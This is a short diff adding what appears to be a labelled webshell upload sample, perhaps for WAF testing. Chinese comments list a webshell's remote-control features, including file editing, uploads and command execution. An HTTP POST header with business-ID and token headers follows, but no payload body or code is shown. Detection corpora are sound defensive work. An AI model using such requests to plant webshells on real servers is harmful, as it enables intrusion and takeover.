@@ -1,0 +1,12 @@
+# WebShell#966-80024646
+# 这是一个用于远程管理web服务器的webshell。
+# 它包含各种功能，例如查看目录，查看/编辑文件，下载/上传文件，创建/删除目录/文件，执行命令等。
+# 用户可以通过在浏览器中输入密码和命令来操作服务器。
+POST /?bid=hd_tag_m8mv24ti HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24ti
+RM-PRO-Token: 4d95785373c3e0f8a7fe59f037af994d
+RM-PRO-Time: 1742808413000
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=YK2s4AaajaX2B7zUqYsp2f5HQZY_VWxl
+
